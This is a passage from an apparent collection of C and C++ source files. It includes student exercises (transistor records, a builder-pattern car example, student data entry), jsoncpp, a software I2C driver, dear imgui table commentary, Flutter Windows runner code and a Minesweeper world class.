endl;\n\n    return 0;\n}\n",
    "\ufeff#include <iostream>\n#include <Windows.h>\n\nusing namespace std;\n\nconst int MAX_TRANSISTORS = 4; \n\nstruct Transistor {\n    string name;\n    string type; \n    float power;\n    float maxCurrent;\n    int count;\n};\n\nvoid printTransistorInfo(Transistor t) {\n    setlocale(LC_ALL, \"Ukrainian\");\n    cout << \"  Name: \" << t.name << endl;\n    cout << \"  Type: \" << t.type << endl;\n    cout << \"  Power: \" << t.power << \" \u0412\u0442\" << endl;\n    cout << \"  Maximum operating current: \" << t.maxCurrent << \" \u0410\" << endl;\n    cout << \"  Quantity: \" << t.count << endl << endl;\n}\n\nTransistor findMaxPowerTransistor(Transistor transistors[]) {\n    Transistor maxPowerTransistor = transistors[0];\n    for (int i = 1; i < MAX_TRANSISTORS; i++) {\n        if (transistors[i].power > maxPowerTransistor.power) {\n            maxPowerTransistor = transistors[i];\n        }\n    }\n    return maxPowerTransistor;\n}\n\nint main() {\n    setlocale(LC_ALL, \"Ukrainian\");\n\n    Transistor transistors[MAX_TRANSISTORS];\n\n    \n    for (int i = 0; i < MAX_TRANSISTORS; i++) {\n        cout << \"Enter information about the transistor \" << i + 1 << \":\" << endl;\n        cout << \"  : \";\n        cin >> transistors[i].name;\n        cout << \"  Type (npn/pnp): \";\n        cin >> transistors[i].type;\n        cout << \"  Power (\u0412\u0442): \";\n        cin >> transistors[i].power;\n        cout << \"  Maximum operating current (\u0410): \";\n        cin >> transistors[i].maxCurrent;\n        cout << \"  Quantity: \";\n        cin >> transistors[i].count;\n    }\n\n    \n    cout << endl << \"List of transistors:\" << endl;\n    for (int i = 0; i < MAX_TRANSISTORS; i++) {\n        printTransistorInfo(transistors[i]);\n    }\n\n    \n    Transistor maxPowerTransistor = findMaxPowerTransistor(transistors);\n\n   \n    cout << \"Transistor with maximum power:\" << endl;\n    printTransistorInfo(maxPowerTransistor);\n\n    return 0;\n}",
    "/// Json-cpp amalgated source (http://jsoncpp.sourceforge.net/).\n/// It is intended to be used with #include \"json/json.h\"\n\n// //////////////////////////////////////////////////////////////////////\n// Beginning of content of file: LICENSE\n// //////////////////////////////////////////////////////////////////////\n\n/*\nThe JsonCpp library's source code, including accompanying documentation,\ntests and demonstration applications, are licensed under the following\nconditions...\n\nThe author (Baptiste Lepilleur) explicitly disclaims copyright in all\njurisdictions which recognize such a disclaimer. In such jurisdictions,\nthis software is released into the Public Domain.\n\nIn jurisdictions which do not recognize Public Domain property (e.g. Germany as of\n2010), this software is Copyright (c) 2007-2010 by Baptiste Lepilleur, and is\nreleased under the terms of the MIT License (see below).\n\nIn jurisdictions which recognize Public Domain property, the user of this\nsoftware may choose to accept it either as 1) Public Domain, 2) under the\nconditions of the MIT License (see below), or 3) under the terms of dual\nPublic Domain/MIT License conditions described here, as they choose.\n\nThe MIT License is about as close to Public Domain as a license can get, and is\ndescribed in clear, concise terms at:\n\n   http://en.wikipedia.org/wiki/MIT_License\n\nThe full text of the MIT License follows:\n\n========================================================================\nCopyright (c) 2007-2010 Baptiste Lepilleur\n\nPermission is hereby granted, free of charge, to any person\nobtaining a copy of this software and associated documentation\nfiles (the \"Software\"), to deal in the Software without\nrestriction, including without limitation the rights to use, copy,\nmodify, merge, publish, distribute, sublicense, and/or sell copies\nof the Software, and to permit persons to whom the Software is\nfurnished to do so, subject to the following conditions:\n\nThe above copyright notice and this permission notice shall be\nincluded in all copies or substantial portions of the Software.\n\nTHE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND,\nEXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF\nMERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND\nNONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS\nBE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN\nACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN\nCONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE\nSOFTWARE.\n========================================================================\n(END LICENSE TEXT)\n\nThe MIT license is compatible with both the GPL and commercial\nsoftware, affording one all of the rights of Public Domain with the\nminor nuisance of being required to keep the above copyright notice\nand license text in the source code. Note also that by accepting the\nPublic Domain \"license\" you can re-license your copy using whatever\nlicense you like.\n\n*/\n\n// //////////////////////////////////////////////////////////////////////\n// End of content of file: LICENSE\n// //////////////////////////////////////////////////////////////////////\n\n\n\n\n\n\n#include \"third_party/jsoncpp/json.h\"\n\n#ifndef JSON_IS_AMALGAMATION\n#error \"Compile with -I PATH_TO_JSON_DIRECTORY\"\n#endif\n\n\n// //////////////////////////////////////////////////////////////////////\n// Beginning of content of file: src/lib_json/json_tool.h\n// //////////////////////////////////////////////////////////////////////\n\n// Copyright 2007-2010 Baptiste Lepilleur\n// Distributed under MIT license, or public domain if desired and\n// recognized in your jurisdiction.\n// See file LICENSE for detail or copy at http://jsoncpp.sourceforge.net/LICENSE\n\n#ifndef LIB_JSONCPP_JSON_TOOL_H_INCLUDED\n#define LIB_JSONCPP_JSON_TOOL_H_INCLUDED\n\n/* This header provides common string manipulation support, such as UTF-8,\n * portable conversion from/to string...\n *\n * It is an internal header that must not be exposed.\n */\n\nnamespace Json {\n\n/// Converts a unicode code-point to UTF-8.\nstatic inline std::string codePointToUTF8(unsigned int cp) {\n  std::string result;\n\n  // based on description from http://en.wikipedia.org/wiki/UTF-8\n\n  if (cp <= 0x7f) {\n    result.resize(1);\n    result[0] = static_cast<char>(cp);\n  } else if (cp <= 0x7FF) {\n    result.resize(2);\n    result[1] = static_cast<char>(0x80 | (0x3f & cp));\n    result[0] = static_cast<char>(0xC0 | (0x1f & (cp >> 6)));\n  } else if (cp <= 0xFFFF) {\n    result.resize(3);\n    result[2] = static_cast<char>(0x80 | (0x3f & cp));\n    result[1] = static_cast<char>(0x80 | (0x3f & (cp >> 6)));\n    result[0] = static_cast<char>(0xE0 | (0xf & (cp >> 12)));\n  } else if (cp <= 0x10FFFF) {\n    result.resize(4);\n    result[3] = static_cast<char>(0x80 | (0x3f & cp));\n    result[2] = static_cast<char>(0x80 | (0x3f & (cp >> 6)));\n    result[1] = static_cast<char>(0x80 | (0x3f & (cp >> 12)));\n    result[0] = static_cast<char>(0xF0 | (0x7 & (cp >> 18)));\n  }\n\n  return result;\n}\n\n///",
    "#include \"SW_I2C.h\"\r\n\r\nSoftWare_I2C::SoftWare_I2C(uint8_t _SDA_PIN, uint8_t _SCL_PIN) \r\n{\t\r\n\tsetSDA(_SDA_PIN);\r\n\tsetSCL(_SCL_PIN);\r\n} \r\n\r\n\r\n\r\nvoid SoftWare_I2C::startCondition() \r\n{\r\n\t// RESET LINES\r\n\tdigitalWrite(SCL_PIN, 0);\r\n\tdigitalWrite(SDA_PIN, 0);\r\n\t\r\n\t\r\n\tdigitalWrite(SCL_PIN, 1);\r\n\t\r\n\tdigitalWrite(SDA_PIN, 1);\r\n\tdigitalWrite(SDA_PIN, 0);\r\n\t\r\n\tdigitalWrite(SCL_PIN, 0);\r\n\t\r\n}\r\n\r\nvoid SoftWare_I2C::stopCondition() \r\n{\r\n\t// RESET LINES\r\n\tdigitalWrite(SCL_PIN, 0);\r\n\tdigitalWrite(SDA_PIN, 0);\r\n\t\r\n\t\r\n\tdigitalWrite(SCL_PIN, 1);\r\n\t\r\n\tdigitalWrite(SDA_PIN, 0);\r\n\tdigitalWrite(SDA_PIN, 1);\r\n\t\r\n\tdigitalWrite(SCL_PIN, 0); \r\n\tdigitalWrite(SDA_PIN, 0); // !\r\n}\r\n\r\nvoid SoftWare_I2C::startCondition(uint8_t address) \r\n{\r\n\tstartCondition();\r\n\twrite(address);\r\n}\r\n\r\n\r\n\r\nvoid SoftWare_I2C::write(uint8_t data) \r\n{\r\n\tuint8_t mask = 0x80;\r\n\t\r\n\tfor (uint8_t i = 0; i < 8; i++) \r\n\t{\t\r\n\t\tif ((data & mask) == 0) \r\n\t\t\tsend_0(); \r\n\t\telse \r\n\t\t\tsend_1();\r\n\t\t\r\n\t\tmask >>= 1;\r\n\t} \r\n\tsend_ACK();\r\n}\r\n\r\n\r\nuint8_t SoftWare_I2C::read() \r\n{\r\n\tuint8_t result = readByte();\r\n\tsend_ACK();\r\n\treturn result;\r\n}\r\n\r\nuint8_t SoftWare_I2C::readLastByte() \r\n{\r\n\tuint8_t result = readByte();\r\n\tsend_NACK();\r\n\treturn result;\r\n}\r\n\r\n\r\nvoid SoftWare_I2C::send_ACK() \r\n{\r\n\tdigitalWrite(SDA_PIN, 0);\r\n\t\r\n\tdigitalWrite(SCL_PIN, 1);\r\n\tdigitalWrite(SCL_PIN, 0); \r\n}\r\n\r\nvoid SoftWare_I2C::send_NACK() \r\n{\r\n\tdigitalWrite(SDA_PIN, 1);\r\n\r\n\tdigitalWrite(SCL_PIN, 1);\r\n\tdigitalWrite(SCL_PIN, 0);\r\n}\r\n\r\n\r\n\r\nvoid SoftWare_I2C::send_0() \r\n{\r\n\tdigitalWrite(SDA_PIN, 0);\r\n\t\r\n\t// LATCH\r\n\tdigitalWrite(SCL_PIN, 1);\r\n\tdigitalWrite(SCL_PIN, 0);\r\n}\r\n\r\nvoid SoftWare_I2C::send_1() \r\n{\t\r\n\tdigitalWrite(SDA_PIN, 1);\r\n\t\r\n\t// LATCH\r\n\tdigitalWrite(SCL_PIN, 1);\r\n\tdigitalWrite(SCL_PIN, 0);\r\n}\r\n\r\nuint8_t SoftWare_I2C::readByte()\r\n{\r\n\tuint8_t result = 0;\r\n\t\r\n\tpinMode(SDA_PIN, INPUT_PULLUP);\r\n\t\r\n\tdigitalWrite(SCL_PIN, 1);\t\r\n\tif (digitalRead(SDA_PIN) != 0)\r\n\t\tresult |= 0x80;\r\n\tdigitalWrite(SCL_PIN, 0);\r\n\t\r\n\tfor (uint8_t i = 1; i < 8; i++) \r\n\t{\t\r\n\t\tdigitalWrite(SCL_PIN, 1);\r\n\t\tif (digitalRead(SDA_PIN) != 0)\r\n\t\t\tresult |= (0x80>>i);\r\n\t\tdigitalWrite(SCL_PIN, 0);\r\n\t} \t\r\n\t\r\n\tpinMode(SDA_PIN, OUTPUT);\r\n\t\r\n\treturn result;\r\n}\r\n\r\n\r\n\r\nvoid SoftWare_I2C::setSDA(uint8_t _SDA_PIN) \r\n{\r\n\tif (_SDA_PIN != -1) \r\n\t{\r\n\t\tSDA_PIN = _SDA_PIN;\r\n\t\tpinMode(SDA_PIN, OUTPUT);\t\r\n\t}\t\r\n}\r\nvoid SoftWare_I2C::setSCL(uint8_t _SCL_PIN)\r\n{\r\n\tif (_SCL_PIN != -1) \r\n\t{\r\n\t\tSCL_PIN = _SCL_PIN;\r\n\t\tpinMode(SCL_PIN, OUTPUT);\t\r\n\t}\t\r\n}",
    "// dear imgui, v1.87\n// (tables and columns code)\n\n/*\n\nIndex of this file:\n\n// [SECTION] Commentary\n// [SECTION] Header mess\n// [SECTION] Tables: Main code\n// [SECTION] Tables: Simple accessors\n// [SECTION] Tables: Row changes\n// [SECTION] Tables: Columns changes\n// [SECTION] Tables: Columns width management\n// [SECTION] Tables: Drawing\n// [SECTION] Tables: Sorting\n// [SECTION] Tables: Headers\n// [SECTION] Tables: Context Menu\n// [SECTION] Tables: Settings (.ini data)\n// [SECTION] Tables: Garbage Collection\n// [SECTION] Tables: Debugging\n// [SECTION] Columns, BeginColumns, EndColumns, etc.\n\n*/\n\n// Navigating this file:\n// - In Visual Studio IDE: CTRL+comma (\"Edit.NavigateTo\") can follow symbols in comments, whereas CTRL+F12 (\"Edit.GoToImplementation\") cannot.\n// - With Visual Assist installed: ALT+G (\"VAssistX.GoToImplementation\") can also follow symbols in comments.\n\n//-----------------------------------------------------------------------------\n// [SECTION] Commentary\n//-----------------------------------------------------------------------------\n\n//-----------------------------------------------------------------------------\n// Typical tables call flow: (root level is generally public API):\n//-----------------------------------------------------------------------------\n// - BeginTable()                               user begin into a table\n//    | BeginChild()                            - (if ScrollX/ScrollY is set)\n//    | TableBeginInitMemory()                  - first time table is used\n//    | TableResetSettings()                    - on settings reset\n//    | TableLoadSettings()                     - on settings load\n//    | TableBeginApplyRequests()               - apply queued resizing/reordering/hiding requests\n//    | - TableSetColumnWidth()                 - apply resizing width (for mouse resize, often requested by previous frame)\n//    |    - TableUpdateColumnsWeightFromWidth()- recompute columns weights (of stretch columns) from their respective width\n// - TableSetupColumn()                         user submit columns details (optional)\n// - TableSetupScrollFreeze()                   user submit scroll freeze information (optional)\n//-----------------------------------------------------------------------------\n// - TableUpdateLayout() [Internal]             followup to BeginTable(): setup everything: widths, columns positions, clipping rectangles. Automatically called by the FIRST call to TableNextRow() or TableHeadersRow().\n//    | TableSetupDrawChannels()                - setup ImDrawList channels\n//    | TableUpdateBorders()                    - detect hovering columns for resize, ahead of contents submission\n//    | TableDrawContextMenu()                  - draw right-click context menu\n//-----------------------------------------------------------------------------\n// - TableHeadersRow() or TableHeader()         user submit a headers row (optional)\n//    | TableSortSpecsClickColumn()             - when left-clicked: alter sort order and sort direction\n//    | TableOpenContextMenu()                  - when right-clicked: trigger opening of the default context menu\n// - TableGetSortSpecs()                        user queries updated sort specs (optional, generally after submitting headers)\n// - TableNextRow()                             user begin into a new row (also automatically called by TableHeadersRow())\n//    | TableEndRow()                           - finish existing row\n//    | TableBeginRow()                         - add a new row\n// - TableSetColumnIndex() / TableNextColumn()  user begin into a cell\n//    | TableEndCell()                          - close existing column/cell\n//    | TableBeginCell()                        - enter into current column/cell\n// - [...]                                      user emit contents\n//-----------------------------------------------------------------------------\n// - EndTable()                                 user ends the table\n//    | TableDrawBorders()                      - draw outer borders, inner vertical borders\n//    | TableMergeDrawChannels()                - merge draw channels if clipping isn't required\n//    | EndChild()                              - (if ScrollX/ScrollY is set)\n//-----------------------------------------------------------------------------\n\n//-----------------------------------------------------------------------------\n// TABLE SIZING\n//-----------------------------------------------------------------------------\n// (Read carefully because this is subtle but it does make sense!)\n//-----------------------------------------------------------------------------\n// About 'outer_size':\n// Its meaning needs to differ slightly depending on if we are using ScrollX/ScrollY flags.\n// Default value is ImVec2(0.0f, 0.0f).\n//   X\n//   - outer_size.x <= 0.0f  ->  Right-align from window/work-rect right-most edge. With -FLT_MIN or 0.0f will align exactly on right-most edge.\n//   - outer_size.x  > 0.0f  ->  Set Fixed width.\n// ",
    "// hw_uml3.cpp : This file contains the 'main' function. Program execution begins and ends there.\n//\n\n#include <iostream>\n#include <string>\nusing namespace std;\nclass Car {\n    string name; //\u00ed\u00e0\u00e7\u00e2\u00e0\u00ed\u00e8\u00e5 \u00ec\u00e0\u00f8\u00e8\u00ed\u00fb\n    string frame;//\u00ea\u00ee\u00f0\u00ef\u00f3\u00f1\n    int engine;//\u00e4\u00e2\u00e8\u00e3\u00e0\u00f2\u00e5\u00eb\u00fc\n    int wheels;//\u00ea\u00ee\u00eb\u00e5\u00f1\u00e0\n    string kpp;//\u00ea\u00ef\u00ef\n\npublic:\n\n    void setName(string n) {\n        this->name = n;\n    }\n\n    void setFrame(string f) {\n       this->frame = f;\n    }\n\n    void setEngine(int e) {\n        this -> engine = e;\n    }\n\n    void setWheels(int w) {\n        this->wheels = w;\n    }\n\n    void setKpp(string k) {\n        this->kpp = k;\n    }\n\n    string getName() {\n        return this->name;\n    }\n\n    string getFrame() {\n        return this->frame;\n    }\n    int getEngine() {\n        return this->engine;\n    }\n\n    int getWheels() {\n        return this->wheels;\n    }\n    string getKpp() {\n        return this->kpp;\n    }\n\n    void showCar() {\n        cout << \"Name: \" << name << endl;\n        cout << \"Frame: \" << frame << endl;\n        cout << \"Engine: \" << engine << endl;\n        cout << \"Wheels: \" << wheels << endl;\n        cout << \"Kpp: \" << kpp << endl;\n    }\n\n};\n\n\n// Abstract Builder \u00e7\u00e0\u00e4\u00e0\u00e5\u00f2 \u00e0\u00e1\u00f1\u00f2\u00f0\u00e0\u00ea\u00f2\u00ed\u00fb\u00e9 \u00e8\u00ed\u00f2\u00e5\u00f0\u00f4\u00e5\u00e9\u00f1 (\u00ea\u00eb\u00e0\u00f1\u00f1) \u00e4\u00eb\u00ff \u00f1\u00ee\u00e7\u00e4\u00e0\u00ed\u00e8\u00ff \u00f7\u00e0\u00f1\u00f2\u00e5\u00e9 \u00ee\u00e1\u00fa\u00e5\u00ea\u00f2\u00e0 Product (\u00e2 \u00ed\u00e0\u00f8\u00e5\u00ec \u00f1\u00eb\u00f3\u00f7\u00e0\u00e5, Car);\n  /** \"Abstract Builder\" */\n\nclass CarBuilder abstract {\nprotected:\n    Car car;\npublic:\n    Car getCar() {\n        return car;\n    }\n    virtual void buildName() abstract;\n    virtual void buildFrame() abstract;\n    virtual void buildEngine() abstract;\n    virtual void buildWheels() abstract;\n    virtual void buildkpp() abstract;\n};\n\nclass DaewooLanas: public CarBuilder {\npublic:\n    void buildName() override {\n        car.setName(\"Daewoo Lanas\");\n    }\n    void buildFrame() override{\n        car.setFrame(\"Sedan\");\n    }\n\n    void buildEngine() override {\n        car.setEngine(98);\n    }\n    void buildWheels() override {\n        car.setWheels(13);\n    }\n    void buildkpp() override {\n        car.setKpp(\"5 manual\");\n    }\n\n};\n\n\nclass FordProbe : public CarBuilder {\npublic:\n    void buildName() override {\n        car.setName(\"Ford Probe\");\n    }\n    void buildFrame() override {\n        car.setFrame(\"Coupe\");\n    }\n\n    void buildEngine() override {\n        car.setEngine(160);\n    }\n    void buildWheels() override {\n        car.setWheels(14);\n    }\n    void buildkpp() override {\n        car.setKpp(\"4 auto\");\n    }\n\n};\n\nclass UAZpatriot : public CarBuilder {\npublic:\n    void buildName() override {\n        car.setName(\"UAZ Patriot\");\n    }\n    void buildFrame() override {\n        car.setFrame(\"Universal\");\n    }\n\n    void buildEngine() override {\n        car.setEngine(120);\n    }\n    void buildWheels() override {\n        car.setWheels(16);\n    }\n    void buildkpp() override {\n        car.setKpp(\"4 manual\");\n    }\n\n};\n\nclass HyundaiGetz : public CarBuilder {\npublic:\n    void buildName() override {\n        car.setName(\"Hyundai Getz\");\n    }\n    void buildFrame() override {\n        car.setFrame(\"Hatchback\");\n    }\n\n    void buildEngine() override {\n        car.setEngine(66);\n    }\n    void buildWheels() override {\n        car.setWheels(13);\n    }\n    void buildkpp() override {\n        car.setKpp(\"4 auto\");\n    }\n\n};\n// Director(\u00f0\u00e0\u00f1\u00ef\u00ee\u00f0\u00ff\u00e4\u00e8\u00f2\u00e5\u00eb\u00fc) - \u00ea\u00ee\u00ed\u00f1\u00f2\u00f0\u00f3\u00e8\u00f0\u00f3\u00e5\u00f2 \u00ee\u00e1\u00fa\u00e5\u00ea\u00f2 (Car), \u00ef\u00ee\u00eb\u00fc\u00e7\u00f3\u00ff\u00f1\u00fc \u00e8\u00ed\u00f2\u00e5\u00f0\u00f4\u00e5\u00e9\u00f1\u00ee\u00ec Builder\nclass Director {\n    CarBuilder* carBuilder;\npublic:\n    void SetCarBuilder(CarBuilder* cb) {\n        carBuilder = cb;\n    }\n    Car getCar() {\n        return carBuilder->getCar();\n    }\n\n    void createCar() {\n        carBuilder->buildName();\n        carBuilder->buildFrame();\n        carBuilder->buildEngine();\n        carBuilder->buildWheels();\n        carBuilder->buildkpp();\n    }\n\n \n\n};\n\n// \u00ea\u00eb\u00e8\u00e5\u00ed\u00f2 \u00f1\u00ee\u00e7\u00e4\u00e0\u00e5\u00f2 \u00ee\u00e1\u00fa\u00e5\u00ea\u00f2-\u00f0\u00e0\u00f1\u00ef\u00ee\u00f0\u00ff\u00e4\u00e8\u00f2\u00e5\u00eb\u00fc Director \u00e8 \u00ea\u00ee\u00ed\u00f4\u00e8\u00e3\u00f3\u00f0\u00e8\u00f0\u00f3\u00e5\u00f2 \u00e5\u00e3\u00ee \u00ed\u00f3\u00e6\u00ed\u00fb\u00ec \u00ee\u00e1\u00fa\u00e5\u00ea\u00f2\u00ee\u00ec-\u00f1\u00f2\u00f0\u00ee\u00e8\u00f2\u00e5\u00eb\u00e5\u00ec Builder\nvoid client(CarBuilder* builder) {\n    Director director;\n    director.SetCarBuilder(builder);\n    director.createCar();\n    Car car = director.getCar();\n    car.showCar();\n}\n\n\n\nint main()\n{\n    CarBuilder* builder = new FordProbe();\n    client(builder);\n    delete builder;\n}\n\n",
    "#include \"utils.h\"\r\n\r\n#include <flutter_windows.h>\r\n#include <io.h>\r\n#include <stdio.h>\r\n#include <windows.h>\r\n\r\n#include <iostream>\r\n\r\nvoid CreateAndAttachConsole() {\r\n  if (::AllocConsole()) {\r\n    FILE *unused;\r\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\r\n      _dup2(_fileno(stdout), 1);\r\n    }\r\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\r\n      _dup2(_fileno(stdout), 2);\r\n    }\r\n    std::ios::sync_with_stdio();\r\n    FlutterDesktopResyncOutputStreams();\r\n  }\r\n}\r\n\r\nstd::vector<std::string> GetCommandLineArguments() {\r\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\r\n  int argc;\r\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\r\n  if (argv == nullptr) {\r\n    return std::vector<std::string>();\r\n  }\r\n\r\n  std::vector<std::string> command_line_arguments;\r\n\r\n  // Skip the first argument as it's the binary name.\r\n  for (int i = 1; i < argc; i++) {\r\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\r\n  }\r\n\r\n  ::LocalFree(argv);\r\n\r\n  return command_line_arguments;\r\n}\r\n\r\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\r\n  if (utf16_string == nullptr) {\r\n    return std::string();\r\n  }\r\n  int target_length = ::WideCharToMultiByte(\r\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\r\n      -1, nullptr, 0, nullptr, nullptr)\r\n    -1; // remove the trailing null character\r\n  int input_length = (int)wcslen(utf16_string);\r\n  std::string utf8_string;\r\n  if (target_length <= 0 || target_length > utf8_string.max_size()) {\r\n    return utf8_string;\r\n  }\r\n  utf8_string.resize(target_length);\r\n  int converted_length = ::WideCharToMultiByte(\r\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\r\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\r\n  if (converted_length == 0) {\r\n    return std::string();\r\n  }\r\n  return utf8_string;\r\n}\r\n",
    "#include <iostream>\nusing namespace std;\n\nstruct DetailAlamat {\n\tstring desa;\n\tstring kota;\n};\n\nstruct Mahasiswa {\n\tstring nim;\n\tstring nama;\n\tDetailAlamat alamat;\n\tstring umur;\n};\n\nint main() {\n\tMahasiswa mhs[3];\n\tfor (int i = 0; i < 3; i++) {\n\t\tcout << \"Data ke- \" << (i + 1) << \":\" << endl;\n\t\tcout << \"Nomor Mahasiswa : \";\n\t\tcin >> mhs[i].nim;\n\t\tcout << \"Nama Mahasiswa : \";\n\t\tcin >> mhs[i].nama;\n\n\t\tcout << \"Alamat Mahasiswa : \" << endl;\n\t\tcout << \"\\t Nama Desa : \";\n\t\tcin >> mhs[i].alamat.desa;\n\t\tcout << \"\\t Nama Kota : \";\n\t\tcin >> mhs[i].alamat.kota;\n\t\tcout << \"Umur Mahasiswa : \";\n\t\tcin >> mhs[i].umur;\n\t\tcin.ignore(1, '\\n');\n\t\tcout << endl;\n\t}\n\tfor (int i = 0; i < 3; i++) {\n\t\tcout << endl;\n\t\tcout << \"Data Mahasiswa ke- \" << (i + 1) << \":\" << endl;\n\t\tcout << \"\\n NIM : \" << mhs[i].nim;\n\t\tcout << \"\\n Nama : \" << mhs[i].nama;\n\t\tcout << \"\\n Alamat : \";\n\t\tcout << \"\\n \\t Desa : \" << mhs[i].alamat.desa;\n\t\tcout << \"\\n \\t Kota : \" << mhs[i].alamat.kota;\n\t\tcout << \"\\n Umur : \" << mhs[i].umur;\n\t\tcout << endl;\n\t}\n\n\n\t\n}",
    "\ufeff// ConsoleDoubleBuffering.cpp : \uc774 \ud30c\uc77c\uc5d0\ub294 'main' \ud568\uc218\uac00 \ud3ec\ud568\ub429\ub2c8\ub2e4. \uac70\uae30\uc11c \ud504\ub85c\uadf8\ub7a8 \uc2e4\ud589\uc774 \uc2dc\uc791\ub418\uace0 \uc885\ub8cc\ub429\ub2c8\ub2e4.\n//\n\n#include <iostream>\n#include <Windows.h>\n#include <conio.h>\n#include \"ConsoleRenderer.h\"\n\n\nbool g_bQuit = false;\nvoid Update();\nvoid Render();\nvoid ProcessInput();\n\nCOORD g_Player = { 0,0 };\n\nint main()\n{\n\tConsoleRenderer::ScreenInit();\n\n\twhile (!g_bQuit)\n\t{\n\t\tProcessInput();\n\t\tUpdate();\n\t\tRender();\n\t};\n\n\tConsoleRenderer::ScreenRelease();\n}\n\n\nvoid ProcessInput()\n{\n\tif (GetAsyncKeyState(VK_LEFT) & 0x8000) { //\uc67c\ucabd\n\t\tg_Player.X--;\n\t}\n\tif (GetAsyncKeyState(VK_RIGHT) & 0x8000) { //\uc624\ub978\ucabd\n\t\tg_Player.X++;\n\t}\n\tif (GetAsyncKeyState(VK_UP) & 0x8000) { //\uc704\n\t\tg_Player.Y--;\n\t}\n\tif (GetAsyncKeyState(VK_DOWN) & 0x8000) { //\uc544\ub798\n\t\tg_Player.Y++;\n\t}\n\tif (GetAsyncKeyState(VK_ESCAPE) & 0x8000) { //\uc885\ub8cc\n\t\tg_bQuit = true;\n\t}\n\n}\n\nvoid Update()\n{\n\tif (g_Player.X < 0) g_Player.X = 0;\n\tif (g_Player.X >= ConsoleRenderer::ScreenWidth()) g_Player.X = ConsoleRenderer::ScreenWidth() - 1;\n\tif (g_Player.Y < 0) g_Player.Y = 0;\n\tif (g_Player.Y >= ConsoleRenderer::ScreenHeight()) g_Player.Y = ConsoleRenderer::ScreenHeight() - 1;\n}\n\nvoid Render()\n{\n\tConsoleRenderer::ScreenClear();\n\tConsoleRenderer::ScreenSetString(0, 0, \"Hello \uc548\ub155\", FG_PINK_DARK);\n\tConsoleRenderer::ScreenSetChar(g_Player.X, g_Player.Y, 'P', FG_WHITE);\n\tConsoleRenderer::ScreenFlipping();\n}\n\n\n",
    "#include \"flutter_window.h\"\n\n#include <optional>\n\n#include \"flutter/generated_plugin_registrant.h\"\n\nFlutterWindow::FlutterWindow(const flutter::DartProject& project)\n    : project_(project) {}\n\nFlutterWindow::~FlutterWindow() {}\n\nbool FlutterWindow::OnCreate() {\n  if (!Win32Window::OnCreate()) {\n    return false;\n  }\n\n  RECT frame = GetClientArea();\n\n  // The size here must match the window dimensions to avoid unnecessary surface\n  // creation / destruction in the startup path.\n  flutter_controller_ = std::make_unique<flutter::FlutterViewController>(\n      frame.right - frame.left, frame.bottom - frame.top, project_);\n  // Ensure that basic setup of the controller was successful.\n  if (!flutter_controller_->engine() || !flutter_controller_->view()) {\n    return false;\n  }\n  RegisterPlugins(flutter_controller_->engine());\n  SetChildContent(flutter_controller_->view()->GetNativeWindow());\n\n  flutter_controller_->engine()->SetNextFrameCallback([&]() {\n    this->Show();\n  });\n\n  // Flutter can complete the first frame before the \"show window\" callback is\n  // registered. The following call ensures a frame is pending to ensure the\n  // window is shown. It is a no-op if the first frame hasn't completed yet.\n  flutter_controller_->ForceRedraw();\n\n  return true;\n}\n\nvoid FlutterWindow::OnDestroy() {\n  if (flutter_controller_) {\n    flutter_controller_ = nullptr;\n  }\n\n  Win32Window::OnDestroy();\n}\n\nLRESULT\nFlutterWindow::MessageHandler(HWND hwnd, UINT const message,\n                              WPARAM const wparam,\n                              LPARAM const lparam) noexcept {\n  // Give Flutter, including plugins, an opportunity to handle window messages.\n  if (flutter_controller_) {\n    std::optional<LRESULT> result =\n        flutter_controller_->HandleTopLevelWindowProc(hwnd, message, wparam,\n                                                      lparam);\n    if (result) {\n      return *result;\n    }\n  }\n\n  switch (message) {\n    case WM_FONTCHANGE:\n      flutter_controller_->engine()->ReloadSystemFonts();\n      break;\n  }\n\n  return Win32Window::MessageHandler(hwnd, message, wparam, lparam);\n}\n",
    "// ======================================================================\n// FILE:        World.cpp\n//\n// AUTHOR:      Jian Li\n//\n// DESCRIPTION: This file contains the world class, which is responsible\n//              for everything game related.\n//\n// NOTES:       - Don't make changes to this file.\n// ======================================================================\n//\n\n#include \"World.hpp\"\n\nusing namespace std;\n\n// ===============================================================\n// =\t\t\t\tConstructor and Destructor\n// ===============================================================\n\nWorld::World(bool _debug, string aiType, string filename)\n{\n    // Operation Flags\n    debug = _debug;\n\n    // World Initialization\n    // True for file provided; false for file not provided, board with default size and random feature\n    if ( !filename.empty() )\n    {\n\n        // open file\n        ifstream file;\n        file.open(filename);\n\n        file >> rowDimension >> colDimension;\n\n        if (file.fail())\n            throw exception();\n        board = new Tile*[colDimension];\n        for ( int index = 0; index < colDimension; ++index )\n            board[index] = new Tile[rowDimension];\n\n\n        file >> agentX >> agentY;\n        lastAction = genFirstAxis(--agentX, --agentY);\n        addFeatures ( file );\n        file.close();\n\n    }\n    else\n    {\n        totalMines        = 10;\n        colDimension    = 8;\n        rowDimension    = 8;\n        board = new Tile*[colDimension];\n        for ( int index = 0; index < colDimension; ++index )\n            board[index] = new Tile[rowDimension];\n\n        lastAction   = genFirstAxis();\n        agentX       = lastAction.x;\n        agentY       = lastAction.y;\n\n        addFeatures();\n    }\n\n    maxMoves = rowDimension * colDimension * 2;\n\n    switch (colDimension)\n    {\n        case 8:\n            Bonus = 1;\n            break;\n        case 16:\n            Bonus = 2;\n            break;\n        case 30:\n            Bonus = 3;\n            break;\n        default:\n            Bonus = 1;\n            break;\n    }\n\n    // Agent Initialization\n    score      = 0;\n    coveredTiles = rowDimension * colDimension - 1;\n    flagLeft   = totalMines;\n\n    if (aiType == \"randomAI\")\n        